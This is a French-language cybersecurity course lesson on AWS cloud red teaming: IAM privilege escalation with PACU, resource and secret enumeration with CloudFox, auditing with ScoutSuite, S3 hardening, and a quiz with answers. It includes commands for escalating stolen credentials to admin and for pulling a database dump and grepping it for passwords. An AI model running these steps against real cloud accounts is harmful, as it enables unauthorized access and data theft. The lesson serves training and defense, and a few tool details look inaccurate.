# TOME P5 — Cybersécurité Avancée & Red/Blue Team — Jour 229 (6h) : Red Team Cloud Avancé (AWS/Azure/GCP Lateral Movement, Privilege Escalation Cloud, PACU Framework, ScoutSuite & CloudFox)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques de **Red Team Cloud avancé** : énumération et escalade de privilèges dans les environnements **AWS, Azure et GCP**, mouvement latéral inter-services Cloud (Lambda → S3 → RDS → ECR), exploitation des mauvaises configurations IAM avec le framework **PACU** (AWS), audit de configurations Cloud avec **ScoutSuite**, et découverte automatisée de ressources exposées avec **CloudFox** — dans le cadre de la sécurisation de l'infrastructure Cloud hybride de la BCC.
>
> **Compétences visées :** `SEC-04` (A) — Red Team Cloud AWS/Azure/GCP Lateral Movement & PrivEsc | `SEC-05` (A) — PACU Framework, ScoutSuite Audit, CloudFox Enumeration & Cloud Attack Paths

---

## 1) Module — Énumération & Privilege Escalation Cloud AWS (2h)

### 📖 Narration/Intuition

Lors d'un engagement Red Team Cloud sur l'infrastructure AWS de la BCC, l'équipe dispose d'un premier accès limité : des credentials IAM de l'utilisateur de service `mnbc-ci-deployer` récupérés depuis un dépôt GitHub mal configuré (secret dans le code source).

À partir de ces credentials initiaux aux permissions apparemment limitées, l'objectif est d'identifier les chemins d'**escalade de privilèges IAM** permettant d'atteindre les permissions d'administrateur AWS.

### 🔍 Anatomie Technique

**Vecteurs d'Escalade de Privilèges IAM AWS (AWS PrivEsc Paths) :**

```
CREDENTIALS INITIAUX (mnbc-ci-deployer — Permissions limitées)
  ↓
  ├── iam:CreatePolicyVersion → Créer une nouvelle version de politique IAM
  │   avec AdministratorAccess et la définir comme version par défaut
  │   ↓
  │   ADMIN AWS ← 🔴 CHEMIN D'ESCALADE CRITIQUE !
  │
  ├── iam:AttachUserPolicy → Attacher une politique AdministratorAccess
  │   directement à son propre utilisateur IAM
  │   ↓
  │   ADMIN AWS ← 🔴 CHEMIN D'ESCALADE CRITIQUE !
  │
  ├── lambda:InvokeFunction + iam:PassRole → Invoquer une Lambda avec
  │   un rôle IAM plus puissant et exécuter du code en son nom
  │   ↓
  │   LATERAL MOVEMENT + PRIVILEGE ESCALATION
  │
  └── sts:AssumeRole → Assumer un rôle Cross-Account avec confiance mal configurée
      ↓
      PIVOT CROSS-ACCOUNT (compte de production BCC)
```

**Énumération des Permissions IAM avec PACU (`pacu_session.sh`) :**

```bash
# PACU — AWS Exploitation Framework (Brian Doolan / Rhino Security Labs)
# Installation
pip3 install pacu

# Lancer PACU avec les credentials volés
pacu

# Dans l'interface PACU (interactive) :
Pacu > import_keys mnbc-ci-deployer

# 1. Énumérer les permissions IAM de l'utilisateur compromis
Pacu > run iam__enum_permissions

# OUTPUT (Permissions découvertes) :
# ✅ iam:CreatePolicyVersion (CRITIQUE — PrivEsc possible !)
# ✅ iam:ListAttachedUserPolicies
# ✅ iam:GetPolicy
# ✅ lambda:InvokeFunction
# ✅ s3:GetObject sur arn:aws:s3:::bcc-mnbc-backups/*
# ✅ ec2:DescribeInstances
# ❌ iam:AttachUserPolicy (bloqué)

# 2. Exploiter iam:CreatePolicyVersion pour l'escalade de privilèges
Pacu > run iam__privesc_scan
# OUTPUT : Path trouvé → iam:CreatePolicyVersion → AdministratorAccess possible !

# 3. Escalade automatique via PACU
Pacu > run iam__privesc_scan --escalate
# ↳ Crée une nouvelle version de politique avec AdministratorAccess
# ↳ La définit comme version active sur le rôle
# ↳ RÉSULTAT : Accès administrateur AWS complet obtenu !
```

---

## 2) Module — Mouvement Latéral Cloud & CloudFox (2h)

### 📖 Narration/Intuition

Une fois les permissions administrateur AWS obtenues, le Red Team doit cartographier rapidement l'ensemble des ressources AWS de la BCC exposées ou mal configurées, et identifier les **chemins d'attaque** vers les données critiques MNBC.

**CloudFox** est un outil open-source spécialement conçu pour cette phase d'exploration des environnements Cloud complexes.

### 🛠️ Atelier Pratique

**Enumération & Mouvement Latéral avec CloudFox (`cloudfox_enum.sh`) :**

```bash
# Installation CloudFox
go install github.com/BishopFox/cloudfox@latest

# 1. Énumération complète de l'infrastructure AWS BCC
cloudfox aws --profile bcc-admin all-checks -o /tmp/cloudfox-bcc/

# 2. Identifier les ressources exposées publiquement
cloudfox aws --profile bcc-admin instances
cloudfox aws --profile bcc-admin lambda
cloudfox aws --profile bcc-admin s3

# OUTPUT (Ressources exposées BCC) :
# ⚠️ EC2 i-0abc123 : Port 22 ouvert depuis 0.0.0.0/0 — SSH public !
# ⚠️ S3 bcc-mnbc-backups : Public Read Access détecté — CRITIQUE !
# ⚠️ Lambda bcc-settlement : URL publique sans auth activée
# ⚠️ RDS db-mnbc-prod : Snapshot public trouvé (données clients exposées !)

# 3. Trouver les chemins d'attaque vers les données critiques
cloudfox aws --profile bcc-admin role-trusts
# OUTPUT : Rôle bcc-cross-account-role trusts compte EXTERNE 987654321012 (inconnu !)
# → Potentielle backdoor de rôle Cross-Account par un ancien prestataire !

# 4. Vérifier les secrets dans les services managés
cloudfox aws --profile bcc-admin secrets
# OUTPUT :
# SSM Parameter /bcc/prod/db-password : PLAINTEXT (non chiffré KMS !)
# Secrets Manager bcc/mnbc-api-key : Chiffré KMS ✅
# Lambda ENV VAR STRIPE_SECRET_KEY: sk_live_XXXX → CRITIQUE (hardcodé dans env)

# 5. Mouvement latéral : Lambda → S3 → RDS
# La Lambda bcc-settlement a les permissions s3:GetObject sur bcc-mnbc-backups
# → Accéder aux backups de la base de données RDS (dump SQL avec credentials !)
aws --profile bcc-admin s3 cp s3://bcc-mnbc-backups/rds-dump-2026-08-01.sql.gz /tmp/
gunzip /tmp/rds-dump-2026-08-01.sql.gz
grep -E "(password|secret|token)" /tmp/rds-dump-2026-08-01.sql
```

---

## 3) Module — Audit Cloud avec ScoutSuite & Hardening (2h)

### 🛠️ Atelier Pratique

**Audit Complet de Configuration Cloud AWS avec ScoutSuite (`scoutsuite_audit.sh`) :**

```bash
# Installation ScoutSuite (NCC Group — Multi-Cloud Security Auditing Tool)
pip3 install scoutsuite

# Lancer l'audit complet AWS de la BCC (mode lecture seule)
scout aws --profile bcc-readonly --report-dir /tmp/scoutsuite-bcc/

# ScoutSuite génère un rapport HTML interactif avec les findings classifiés
# Ouvrir le rapport : /tmp/scoutsuite-bcc/scoutsuite-report.html

# RÉSUMÉ DES FINDINGS SCOUTSUITE BCC (Extrait) :
cat << 'EOF'
=== SCOUTSUITE AUDIT REPORT — BCC AWS ACCOUNT ===

CRITIQUE (Score: 9.0+) :
  [IAM] Root Account MFA Not Enabled — Compte root sans MFA !
  [S3]  Bucket bcc-mnbc-backups : Public Read ACL → Exposition données clients
  [EC2] Security Group sg-0abc : Port 22/3306 ouverts depuis 0.0.0.0/0
  [RDS] DB Snapshot rds-snapshot-20260801 : Publicly Accessible

HAUTE (Score: 7.0-9.0) :
  [IAM] Password Policy : Min 6 chars, no rotation (Doit être 14+ chars, rotation 90j)
  [CloudTrail] Region eu-west-1 : Logging désactivé (Angle mort forensique !)
  [Lambda] 3 fonctions avec rôle IAM AdministratorAccess (Trop permissif)

RECOMMANDATIONS PRIORITAIRES :
  P0 : Activer MFA root + Rotation credentials compromis
  P0 : Bloquer accès public S3 bcc-mnbc-backups (aws s3api put-public-access-block)
  P0 : Restreindre Security Groups (supprimer règles 0.0.0.0/0 sur ports sensibles)
  P1 : Activer CloudTrail dans toutes les régions
  P1 : Refactoriser les rôles Lambda avec Least Privilege
EOF
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **PACU** | Pacu — Framework open-source d'exploitation et de pentest des environnements AWS |
| **CloudFox** | Outil open-source BishopFox de cartographie et d'exploration des environnements Cloud |
| **ScoutSuite** | Outil open-source NCC Group d'audit multi-Cloud (AWS, Azure, GCP) de configurations |
| **STS** | Security Token Service — Service AWS émettant des credentials temporaires pour AssumeRole |
| **ACL S3** | Access Control List S3 — Liste de contrôle d'accès sur les objets/buckets Amazon S3 |
| **WORM** | Write Once, Read Many — Politique de stockage immuable (ex: S3 Object Lock) |

---

## 🏋️ Exercices & Corrigés

**Exercice 1 :** Expliquer le mécanisme d'escalade de privilèges IAM AWS via la permission `iam:CreatePolicyVersion` et comment un attaquant peut l'exploiter pour obtenir des droits administrateur complets.

**Corrigé :** En AWS IAM, les **politiques gérées (Managed Policies)** peuvent avoir jusqu'à 5 versions simultanées, dont une seule est marquée comme la version "par défaut" active. La permission `iam:CreatePolicyVersion` permet à un utilisateur IAM de créer une **nouvelle version** d'une politique existante — avec un nouveau document de politique qu'il choisit lui-même. L'exploit : (1) L'attaquant dispose de `iam:CreatePolicyVersion` sur une politique déjà attachée à son utilisateur (ex: la politique `bcc-ci-deployer-policy`). (2) Il crée une **nouvelle version** de cette politique avec le document `{"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}` (AdministratorAccess). (3) Il définit cette nouvelle version comme la version **par défaut** (`SetDefaultPolicyVersion`). (4) Immédiatement, son utilisateur IAM hérite des permissions AdministratorAccess complètes. **Contre-mesure** : Ne jamais accorder `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion`, `iam:AttachUserPolicy`, `iam:AttachRolePolicy` ou `iam:PassRole` à des utilisateurs non-administrateurs. Utiliser AWS Organizations SCPs pour bloquer ces permissions au niveau du compte.

**Exercice 2 :** Suite à l'audit ScoutSuite révélant qu'un bucket S3 `bcc-mnbc-backups` est en **accès public en lecture**, proposer les commandes AWS CLI permettant de bloquer immédiatement cet accès et d'activer le chiffrement obligatoire sur tous les objets.

**Corrigé :**

```bash
# 1. Bloquer TOUT accès public au bucket (Block Public Access — Protection en 4 dimensions)
aws s3api put-public-access-block \
    --bucket bcc-mnbc-backups \
    --public-access-block-configuration \
    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"

# 2. Supprimer la politique de bucket rendant le contenu public (si existante)
aws s3api delete-bucket-policy --bucket bcc-mnbc-backups

# 3. Activer le chiffrement côté serveur obligatoire avec KMS (SSE-KMS)
aws s3api put-bucket-encryption \
    --bucket bcc-mnbc-backups \
    --server-side-encryption-configuration \
    '{"Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "aws:kms",
      "KMSMasterKeyID": "arn:aws:kms:af-south-1:123456789:key/bcc-s3-key"},
      "BucketKeyEnabled": true}]}'

# 4. Activer S3 Object Lock (WORM) sur les backups pour l'immuabilité forensique
# (Nécessite la recréation du bucket avec Object Lock activé à la création)
# aws s3api create-bucket --bucket bcc-mnbc-backups-v2 \
#     --object-lock-enabled-for-bucket --region af-south-1

echo "✅ Accès public S3 bloqué + Chiffrement KMS activé sur bcc-mnbc-backups"
```

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel framework open-source de pentest des environnements AWS (développé par Rhino Security Labs) permet d'automatiser l'énumération des permissions IAM et d'identifier/exploiter les chemins d'escalade de privilèges comme `iam:CreatePolicyVersion` ?
- A) PACU
- B) Metasploit
- C) Caldera
- D) OpenVAS

**Réponse : A**

**Q2 :** Quelle permission IAM AWS dangereuse permet à un attaquant de créer une nouvelle version d'une politique gérée AWS avec des droits AdministratorAccess et de l'activer, obtenant ainsi des droits root sur le compte AWS ?
- A) `iam:CreatePolicyVersion` + `iam:SetDefaultPolicyVersion`
- B) `s3:PutObject`
- C) `ec2:RunInstances`
- D) `lambda:InvokeFunction`

**Réponse : A**

**Q3 :** Quel outil open-source de BishopFox permet de cartographier automatiquement les ressources, rôles, secrets et chemins d'attaque dans un environnement AWS complexe lors d'un engagement Red Team Cloud ?
- A) CloudFox
- B) Nessus
- C) Burp Suite
- D) Suricata

**Réponse : A**

**Q4 :** Lors de l'audit ScoutSuite de l'infrastructure AWS BCC, quelle finding critique de type **IAM** représente la vulnérabilité de sécurité la plus grave sur le compte AWS et doit être corrigée en priorité absolue (P0) ?
- A) Le compte root AWS sans MFA activée — permet une prise de contrôle complète du compte par quiconque connaît le mot de passe root
- B) Une politique IAM sans condition MFA
- C) Un rôle Lambda avec des droits SQS
- D) Un bucket S3 avec versioning désactivé

**Réponse : A**

**Q5 :** Dans un mouvement latéral Cloud AWS (Lambda → S3 → RDS), quelle configuration erronée de la fonction Lambda `bcc-settlement` a permis à l'attaquant d'accéder au dump SQL de la base de données RDS de production ?
- A) Le rôle IAM de la Lambda disposait de la permission `s3:GetObject` sur le bucket `bcc-mnbc-backups` contenant les dumps RDS — permission excessive accordée par violation du Least Privilege
- B) La Lambda n'était pas chiffrée avec KMS
- C) La Lambda était déployée dans une VPC publique
- D) La Lambda utilisait Python 3.8 au lieu de Python 3.12

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
